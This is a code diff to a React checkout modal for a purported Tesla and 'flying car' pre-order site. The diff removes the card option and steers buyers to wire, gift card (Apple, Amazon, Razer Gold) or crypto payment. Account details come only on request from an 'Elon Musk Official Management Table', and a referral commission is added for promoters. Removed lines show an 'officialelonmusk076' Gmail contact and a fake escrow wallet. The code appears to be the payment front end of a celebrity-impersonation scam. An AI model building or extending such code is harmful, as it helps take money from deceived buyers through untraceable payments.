@@ -1,20 +1,30 @@
-import React, { useState, useId } from 'react';
+import React, { useState } from 'react';
 import { 
   X, 
   Check, 
   ShieldCheck, 
   Sparkles, 
-  CreditCard, 
   Wind, 
   Zap, 
   CheckCircle2, 
   QrCode, 
   Download, 
   ChevronRight,
-  Flame,
-  ArrowRight
+  Lock,
+  Send,
+  Copy,
+  Mail,
+  Clock
 } from 'lucide-react';
-import { TeslaVehicle, TeslaOrder, VehicleColorOption, VehicleWheelOption, VehiclePackageOption } from '../types';
+import {
+  TeslaVehicle,
+  TeslaOrder,
+  VehicleColorOption,
+  VehicleWheelOption,
+  VehiclePackageOption,
+  AdminPaymentAccounts,
+  PaymentAccountRequest,
+} from '../types';
 import { getVehicleDetailedSpecs } from '../data/teslaVehicles';
 
 interface TeslaOrderModalProps {
@@ -22,6 +32,19 @@ interface TeslaOrderModalProps {
   vehicle: TeslaVehicle | null;
   onClose: () => void;
   onOrderCompleted: (order: TeslaOrder) => void;
+  defaultReferralCode?: string;
+  commissionPercent?: number;
+  adminPaymentAccounts?: AdminPaymentAccounts;
+  paymentAccountRequests?: PaymentAccountRequest[];
+  onRequestPaymentAccount?: (payload: {
+    paymentMethod: 'wire' | 'gift_card' | 'crypto';
+    vehicleName: string;
+    amountDue: number;
+    visitorName: string;
+    visitorEmail: string;
+    note?: string;
+  }) => PaymentAccountRequest;
+  onOpenInbox?: () => void;
 }
 
 export const TeslaOrderModal: React.FC<TeslaOrderModalProps> = ({
@@ -29,6 +52,12 @@ export const TeslaOrderModal: React.FC<TeslaOrderModalProps> = ({
   vehicle,
   onClose,
   onOrderCompleted,
+  defaultReferralCode = '',
+  commissionPercent = 5,
+  adminPaymentAccounts,
+  paymentAccountRequests = [],
+  onRequestPaymentAccount,
+  onOpenInbox,
 }) => {
   if (!isOpen || !vehicle) return null;
 
@@ -37,6 +66,12 @@ export const TeslaOrderModal: React.FC<TeslaOrderModalProps> = ({
       vehicle={vehicle}
       onClose={onClose}
       onOrderCompleted={onOrderCompleted}
+      defaultReferralCode={defaultReferralCode}
+      commissionPercent={commissionPercent}
+      adminPaymentAccounts={adminPaymentAccounts}
+      paymentAccountRequests={paymentAccountRequests}
+      onRequestPaymentAccount={onRequestPaymentAccount}
+      onOpenInbox={onOpenInbox}
     />
   );
 };
@@ -45,7 +80,30 @@ const TeslaOrderModalInner: React.FC<{
   vehicle: TeslaVehicle;
   onClose: () => void;
   onOrderCompleted: (order: TeslaOrder) => void;
-}> = ({ vehicle, onClose, onOrderCompleted }) => {
+  defaultReferralCode: string;
+  commissionPercent: number;
+  adminPaymentAccounts?: AdminPaymentAccounts;
+  paymentAccountRequests: PaymentAccountRequest[];
+  onRequestPaymentAccount?: (payload: {
+    paymentMethod: 'wire' | 'gift_card' | 'crypto';
+    vehicleName: string;
+    amountDue: number;
+    visitorName: string;
+    visitorEmail: string;
+    note?: string;
+  }) => PaymentAccountRequest;
+  onOpenInbox?: () => void;
+}> = ({
+  vehicle,
+  onClose,
+  onOrderCompleted,
+  defaultReferralCode,
+  commissionPercent,
+  adminPaymentAccounts,
+  paymentAccountRequests,
+  onRequestPaymentAccount,
+  onOpenInbox,
+}) => {
   const vehicleSpecs = getVehicleDetailedSpecs(vehicle);
 
   // Configuration State
@@ -70,8 +128,10 @@ const TeslaOrderModalInner: React.FC<{
   const [deliveryAddress, setDeliveryAddress] = useState('');
   const [city, setCity] = useState('');
   const [postalCode, setPostalCode] = useState('');
-  const [paymentMethod, setPaymentMethod] = useState<'card' | 'wire' | 'crypto'>('card');
-  const [cardNumber, setCardNumber] = useState('4242 •••• •••• 4242');
+  const [paymentMethod, setPaymentMethod] = useState<'wire' | 'gift_card' | 'crypto'>('wire');
+  const [accountRequestNote, setAccountRequestNote] = useState('');
+  const [copiedAccount, setCopiedAccount] = useState(false);
+  const [referralCodeInput, setReferralCodeInput] = useState(defaultReferralCode);
   const [confirmedOrder, setConfirmedOrder] = useState<TeslaOrder | null>(null);
   const [certificateDownloaded, setCertificateDownloaded] = useState(false);
 
@@ -150,7 +210,9 @@ const TeslaOrderModalInner: React.FC<{
     const vinPrefix = vehicle.isFlyingCar ? '5YJSA-FLY' : '5YJSA-TSL';
     const reservationVin = `${vinPrefix}-${randomSuffix}`;
     const orderId = `TSLA-ORD-${Date.now().toString().slice(-6)}`;
-    const paymentRef = `${paymentMethod.toUpperCase()}-${Date.now().toString().slice(-6)}`;
+    const paymentRefPrefix =
+      paymentMethod === 'wire' ? 'WIRE' : paymentMethod === 'gift_card' ? 'GIFT' : 'CRYPTO';
+    const paymentRef = `${paymentRefPrefix}-${Date.now().toString().slice(-6)}`;
 
     const now = new Date();
     const formattedTimestamp = now.toLocaleString('en-US', {
@@ -160,6 +222,11 @@ const TeslaOrderModalInner: React.FC<{
       hour: 'numeric',
       minute: '2-digit',
     });
+
+    const normalizedRef = referralCodeInput.trim().toUpperCase();
+    const referralCommissionAmount = normalizedRef
+      ? Math.round(realPriceSold * (commissionPercent / 100) * 100) / 100
+      : undefined;
 
     const newOrder: TeslaOrder = {
       orderId,
@@ -189,12 +256,15 @@ const TeslaOrderModalInner: React.FC<{
       status: 'Pending Admin Payment Approval',
       estimatedDelivery: vehicle.deliveryEstimate,
       flightModeCertified: vehicle.isFlyingCar,
+      referralCodeUsed: normalizedRef || undefined,
+      referralCommissionPercent: normalizedRef ? commissionPercent : undefined,
+      referralCommissionAmount,
       trackingHistory: [
         {
           id: `trk-init-${now.getTime()}`,
           stage: 'Production',
           title: 'Reservation & Payment Submitted',
-          details: `${paymentMode === 'full' ? 'Full vehicle settlement' : '20% advance deposit'} ($${amountPaidToday.toLocaleString()}) via ${paymentMethod.toUpperCase()} (${paymentRef}) directed to Executive Admin Approval Desk.`,
+          details: `${paymentMode === 'full' ? 'Full vehicle settlement' : '20% advance deposit'} ($${amountPaidToday.toLocaleString()}) via ${paymentMethod === 'gift_card' ? 'GIFT CARD' : paymentMethod.toUpperCase()} (${paymentRef}) sent to Elon Musk Official Management Table for account provisioning & verification.${normalizedRef ? ` Referral Code ${normalizedRef} (${commissionPercent}% commission) attached.` : ''}`,
           location: `${deliveryAddress || '701 Brazos St'}, ${city || 'Austin, TX'}`,
           timestamp: now.toISOString(),
           dateStr: formattedTimestamp,
@@ -648,6 +718,22 @@ const TeslaOrderModalInner: React.FC<{
                   />
                 </div>
               </div>
+
+              <div className="space-y-1">
+                <div className="flex items-center justify-between text-xs">
+                  <label className="font-semibold text-slate-200">Referral Code (Optional)</label>
+                  <span className="text-[11px] font-mono text-emerald-400 tabular-nums">
+                    Referrer earns {commissionPercent}% (${Math.round(realPriceSold * (commissionPercent / 100)).toLocaleString()})
+                  </span>
+                </div>
+                <input
+                  type="text"
+                  value={referralCodeInput}
+                  onChange={(e) => setReferralCodeInput(e.target.value.toUpperCase())}
+                  placeholder="e.g. ELON-XXXX-XX"
+                  className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 font-mono uppercase focus:outline-none focus:border-blue-400"
+                />
+              </div>
             </div>
 
             {/* Payment Method */}
@@ -655,18 +741,7 @@ const TeslaOrderModalInner: React.FC<{
               <h4 className="text-xs font-bold text-slate-100 uppercase tracking-wider">
                 2. Payment Method
               </h4>
-              <div className="grid grid-cols-3 gap-3">
-                <button
-                  type="button"
-                  onClick={() => setPaymentMethod('card')}
-                  className={`p-3 rounded-lg border text-xs font-semibold transition-all cursor-pointer ${
-                    paymentMethod === 'card'
-                      ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
-                      : 'bg-[#08142b] border-blue-900/70 text-slate-300'
-                  }`}
-                >
-                  Credit / Debit Card
-                </button>
+              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                 <button
                   type="button"
                   onClick={() => setPaymentMethod('wire')}
@@ -677,6 +752,17 @@ const TeslaOrderModalInner: React.FC<{
                   }`}
                 >
                   Wire Transfer / ACH
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setPaymentMethod('gift_card')}
+                  className={`p-3 rounded-lg border text-xs font-semibold transition-all cursor-pointer ${
+                    paymentMethod === 'gift_card'
+                      ? 'bg-gradient-to-r from-blue-600 to-red-600 text-white border-blue-400'
+                      : 'bg-[#08142b] border-blue-900/70 text-slate-300'
+                  }`}
+                >
+                  Gift Card
                 </button>
                 <button
                   type="button"
@@ -691,58 +777,164 @@ const TeslaOrderModalInner: React.FC<{
                 </button>
               </div>
 
-              {paymentMethod === 'card' && (
-                <div className="p-4 rounded-xl bg-[#08142b] border border-blue-900/70 space-y-3">
-                  <div className="flex items-center justify-between text-xs text-slate-300">
-                    <span>Card Information</span>
-                    <span className="text-emerald-400 flex items-center gap-1 font-mono text-[11px]">
-                      <ShieldCheck className="w-3.5 h-3.5" /> 256-Bit Encrypted
-                    </span>
-                  </div>
-                  <input
-                    type="text"
-                    value={cardNumber}
-                    onChange={(e) => setCardNumber(e.target.value)}
-                    className="w-full px-3.5 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded text-slate-100 font-mono tabular-nums"
-                  />
-                  <div className="grid grid-cols-2 gap-3 text-xs">
-                    <input
-                      type="text"
-                      defaultValue="11 / 28"
-                      className="px-3 py-2 bg-[#040a18] border border-blue-900/70 rounded text-slate-100 font-mono tabular-nums"
-                    />
-                    <input
-                      type="text"
-                      defaultValue="CVC 888"
-                      className="px-3 py-2 bg-[#040a18] border border-blue-900/70 rounded text-slate-100 font-mono tabular-nums"
-                    />
-                  </div>
-                </div>
-              )}
+              {/* Payment Account Box (Admin Provided / Visitor Request) */}
+              {(() => {
+                const issuedRequest = paymentAccountRequests.find(
+                  (r) => r.paymentMethod === paymentMethod && r.status === 'issued' && r.issuedAccountDetails
+                );
+                const pendingRequest = paymentAccountRequests.find(
+                  (r) => r.paymentMethod === paymentMethod && r.status === 'pending_admin'
+                );
+                const globalAccount =
+                  paymentMethod === 'wire'
+                    ? adminPaymentAccounts?.wireDetails?.trim()
+                    : paymentMethod === 'gift_card'
+                    ? adminPaymentAccounts?.giftCardInstructions?.trim()
+                    : adminPaymentAccounts?.cryptoAddress?.trim();
+                const activeAdminAccount = issuedRequest?.issuedAccountDetails?.trim() || globalAccount || '';
 
-              {paymentMethod === 'wire' && (
-                <div className="p-4 rounded-xl bg-[#08142b] border border-blue-900/70 text-xs text-slate-200 space-y-2">
-                  <div className="font-semibold text-white">Tesla Treasury Escrow Account:</div>
-                  <div className="font-mono text-[11px] text-blue-300 tabular-nums">
-                    Bank: JPMorgan Chase NA · Routing: 021000021 · Account: 849204918239
-                  </div>
-                  <div className="text-[11px] text-slate-400">
-                    Reservation VIN will be held for 72 hours pending transfer confirmation.
-                  </div>
-                </div>
-              )}
+                if (activeAdminAccount) {
+                  return (
+                    <div className="p-4 rounded-xl bg-[#08142b] border border-emerald-500/45 text-xs text-slate-200 space-y-2.5">
+                      <div className="flex items-center justify-between gap-2">
+                        <div className="font-semibold text-white flex items-center gap-1.5">
+                          <ShieldCheck className="w-4 h-4 text-emerald-400" />
+                          <span>
+                            {paymentMethod === 'wire'
+                              ? 'Admin-Issued Wire Transfer / ACH Account'
+                              : paymentMethod === 'gift_card'
+                              ? 'Admin-Issued Gift Card Settlement Details'
+                              : 'Admin-Issued Crypto Settlement Wallet'}
+                          </span>
+                        </div>
+                        <button
+                          type="button"
+                          onClick={() => {
+                            navigator.clipboard.writeText(activeAdminAccount);
+                            setCopiedAccount(true);
+                            setTimeout(() => setCopiedAccount(false), 2000);
+                          }}
+                          className="px-2.5 py-1 rounded-md bg-[#040a18] border border-blue-800/70 text-[11px] font-mono text-blue-200 hover:text-white flex items-center gap-1 cursor-pointer"
+                        >
+                          {copiedAccount ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
+                          <span>{copiedAccount ? 'Copied' : 'Copy'}</span>
+                        </button>
+                      </div>
+                      <div className="p-3 rounded-lg bg-[#040a18] border border-blue-900/70 font-mono text-[11px] text-blue-200 whitespace-pre-wrap break-all tabular-nums">
+                        {activeAdminAccount}
+                      </div>
+                      <div className="text-[11px] text-slate-400">
+                        Verified settlement account provisioned directly by the Elon Musk Official Management Table. Submit your reservation below once transfer is initiated.
+                      </div>
+                    </div>
+                  );
+                }
 
-              {paymentMethod === 'crypto' && (
-                <div className="p-4 rounded-xl bg-[#08142b] border border-blue-900/70 text-xs text-slate-200 space-y-2">
-                  <div className="font-semibold text-white">Direct Crypto Settlement:</div>
-                  <div className="font-mono text-[11px] text-blue-300 break-all">
-                    BTC / DOGE Gateway: 1TeslaMuskEscrowColdWallet9284xSPX
+                if (pendingRequest) {
+                  return (
+                    <div className="p-4 rounded-xl bg-[#08142b] border border-blue-500/45 text-xs text-slate-200 space-y-3">
+                      <div className="flex items-center justify-between gap-2">
+                        <div className="font-semibold text-white flex items-center gap-2">
+                          <Clock className="w-4 h-4 text-blue-400" />
+                          <span>
+                            {paymentMethod === 'wire'
+                              ? 'Wire Transfer / ACH Account Requested'
+                              : paymentMethod === 'gift_card'
+                              ? 'Gift Card Settlement Account Requested'
+                              : 'Crypto Wallet Address Requested'}
+                          </span>
+                        </div>
+                        <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-blue-950 border border-blue-500/40 text-blue-200">
+                          {pendingRequest.id} · Pending Admin
+                        </span>
+                      </div>
+                      <p className="text-[11px] text-slate-300 leading-relaxed">
+                        {paymentMethod === 'wire'
+                          ? 'Your request for private Wire / ACH settlement credentials has been sent to the Elon Musk Official Management Table for account provisioning. Once authorized and issued, your banking details will appear here and in your In-App Inbox.'
+                          : paymentMethod === 'gift_card'
+                          ? 'Your request for official Gift Card settlement and redemption instructions has been sent to the Elon Musk Official Management Table for account provisioning. Once authorized and issued, your settlement details will appear here and in your In-App Inbox.'
+                          : 'Your request for a verified Bitcoin, DOGE, or USDC settlement address has been sent to the Elon Musk Official Management Table for account provisioning. Once authorized and issued, your wallet address will appear here and in your In-App Inbox.'}
+                      </p>
+                      {onOpenInbox && (
+                        <button
+                          type="button"
+                          onClick={onOpenInbox}
+                          className="px-3.5 py-2 rounded-lg bg-[#040a18] border border-blue-500/45 hover:border-blue-400 text-blue-200 hover:text-white text-xs font-semibold flex items-center gap-1.5 cursor-pointer transition-colors"
+                        >
+                          <Mail className="w-3.5 h-3.5 text-blue-400" />
+                          <span>Check In-App Inbox for Account</span>
+                        </button>
+                      )}
+                    </div>
+                  );
+                }
+
+                return (
+                  <div className="p-4 rounded-xl bg-[#08142b] border border-blue-900/70 text-xs text-slate-200 space-y-3">
+                    <div className="flex items-center justify-between gap-2">
+                      <div className="font-semibold text-white flex items-center gap-2">
+                        <Lock className="w-4 h-4 text-red-400" />
+                        <span>
+                          {paymentMethod === 'wire'
+                            ? 'Wire Transfer / ACH Account — Admin Issued'
+                            : paymentMethod === 'gift_card'
+                            ? 'Gift Card Settlement — Admin Issued'
+                            : 'Bitcoin / Doge / USDC Wallet — Admin Issued'}
+                        </span>
+                      </div>
+                      <span className="text-[10px] font-mono text-red-300 uppercase">
+                        Private Escrow
+                      </span>
+                    </div>
+                    <p className="text-[11px] text-slate-300 leading-relaxed">
+                      {paymentMethod === 'wire'
+                        ? 'To safeguard client allocations, official Wire and ACH banking credentials are sent to the Elon Musk Official Management Table for account provisioning. Please submit your request below to obtain private settlement instructions prior to initiating your transfer.'
+                        : paymentMethod === 'gift_card'
+                        ? 'To safeguard client allocations, official Gift Card settlement brands and redemption accounts are sent to the Elon Musk Official Management Table for account provisioning. Please submit your request below to obtain private gift card instructions prior to redeeming.'
+                        : 'To safeguard client allocations, verified BTC, DOGE, and USDC settlement addresses are sent to the Elon Musk Official Management Table for account provisioning. Please submit your request below to obtain a dedicated wallet address prior to initiating your transfer.'}
+                    </p>
+                    <div className="flex flex-col sm:flex-row gap-2">
+                      <input
+                        type="text"
+                        value={accountRequestNote}
+                        onChange={(e) => setAccountRequestNote(e.target.value)}
+                        placeholder={
+                          paymentMethod === 'wire'
+                            ? 'Optional note (e.g. Domestic Wire or ACH bank name)...'
+                            : paymentMethod === 'gift_card'
+                            ? 'Preferred card brand or card note (e.g. Apple, Amazon, Razer Gold)...'
+                            : 'Preferred asset / network (e.g. BTC, DOGE, USDC)...'
+                        }
+                        className="flex-1 px-3 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-lg text-slate-100 placeholder:text-slate-500 focus:outline-none focus:border-blue-400"
+                      />
+                      <button
+                        type="button"
+                        onClick={() => {
+                          onRequestPaymentAccount?.({
+                            paymentMethod,
+                            vehicleName: vehicle.name,
+                            amountDue: amountPaidToday,
+                            visitorName: customerName.trim() || 'Prospective Buyer',
+                            visitorEmail: customerEmail.trim() || 'Pending Contact Email',
+                            note: accountRequestNote.trim() || undefined,
+                          });
+                          setAccountRequestNote('');
+                        }}
+                        className="px-4 py-2 rounded-lg bg-gradient-to-r from-blue-600 to-red-600 hover:brightness-110 text-white text-xs font-bold flex items-center justify-center gap-1.5 cursor-pointer whitespace-nowrap shrink-0 shadow-md"
+                      >
+                        <Send className="w-3.5 h-3.5" />
+                        <span>
+                          {paymentMethod === 'wire'
+                            ? 'Request Wire Account from Admin'
+                            : paymentMethod === 'gift_card'
+                            ? 'Request Gift Card Account from Admin'
+                            : 'Request Crypto Wallet from Admin'}
+                        </span>
+                      </button>
+                    </div>
                   </div>
-                  <div className="text-[11px] text-slate-400">
-                    Instant blockchain confirmation generates official build slot immediately.
-                  </div>
-                </div>
-              )}
+                );
+              })()}
             </div>
 
             <div className="p-4 rounded-xl bg-blue-950/50 border border-blue-500/35 text-xs text-slate-200 space-y-2">
@@ -753,13 +945,10 @@ const TeslaOrderModalInner: React.FC<{
                 </div>
               </div>
               <div className="pt-2 border-t border-blue-500/25 flex flex-col sm:flex-row sm:items-center justify-between text-[11px] text-slate-300 gap-1">
-                <span>Dedicated Vehicle & Flight Pre-Order Support:</span>
-                <a
-                  href="mailto:officialelonmusk076@gmail.com"
-                  className="text-red-300 hover:text-white font-mono font-medium underline underline-offset-2"
-                >
-                  officialelonmusk076@gmail.com
-                </a>
+                <span>Payment &amp; Build Verification:</span>
+                <span className="text-blue-300 font-mono font-medium">
+                  Sent to Elon Musk Official Management Table for Account Provisioning
+                </span>
               </div>
             </div>
 
@@ -805,21 +994,21 @@ const TeslaOrderModalInner: React.FC<{
                 <div className="flex flex-col items-end gap-1">
                   <div className="px-3 py-1.5 rounded-lg bg-gradient-to-r from-blue-600 to-red-600 text-white text-xs font-black tracking-wider uppercase flex items-center gap-1.5 shadow-md">
                     <ShieldCheck className="w-4 h-4" />
-                    <span>PAYMENT FORWARDED TO ADMIN</span>
+                    <span>SENT TO OFFICIAL MANAGEMENT TABLE</span>
                   </div>
                   <span className="text-[10px] font-mono text-red-300">
-                    Awaiting Executive Admin Approval
+                    Awaiting Official Management Table Verification
                   </span>
                 </div>
               </div>
 
-              {/* Admin Approval Notice Banner */}
+              {/* Management Table Approval Notice Banner */}
               <div className="p-3.5 rounded-xl bg-blue-950/60 border border-blue-500/40 text-xs text-blue-100 flex items-start gap-3">
                 <ShieldCheck className="w-5 h-5 text-blue-400 shrink-0 mt-0.5" />
                 <div className="space-y-1">
-                  <div className="font-bold text-white">Payment Status: Directed to Admin for Approval</div>
+                  <div className="font-bold text-white">Payment Status: Sent to Elon Musk Official Management Table</div>
                   <p className="text-[11px] leading-relaxed text-blue-100">
-                    Your {confirmedOrder.paymentMethod} payment reference <span className="font-mono font-bold text-red-300">{confirmedOrder.paymentReference}</span> has been dispatched to the central Admin Approval Desk. Once verified, your factory build slot will be locked. Real-time updates and replies will arrive directly in your in-app inbox.
+                    Your {confirmedOrder.paymentMethod === 'gift_card' ? 'gift card' : confirmedOrder.paymentMethod} payment reference <span className="font-mono font-bold text-red-300">{confirmedOrder.paymentReference}</span> has been sent to the Elon Musk Official Management Table for account provisioning and verification. Once verified, your factory build slot will be locked. Real-time updates and replies will arrive directly in your in-app inbox.
                   </p>
                 </div>
               </div>
@@ -866,7 +1055,7 @@ const TeslaOrderModalInner: React.FC<{
 
             <div className="flex flex-wrap items-center justify-between gap-4 pt-2">
               <div className="text-xs text-slate-300">
-                A confirmation copy with your build certificate has been dispatched to {confirmedOrder.customerEmail}.
+                Payment request <span className="font-mono text-blue-300">{confirmedOrder.orderId}</span> has been sent to the Elon Musk Official Management Table for account provisioning and verification. Updates will arrive in your In-App Inbox.
               </div>
 
               <div className="flex items-center gap-3">
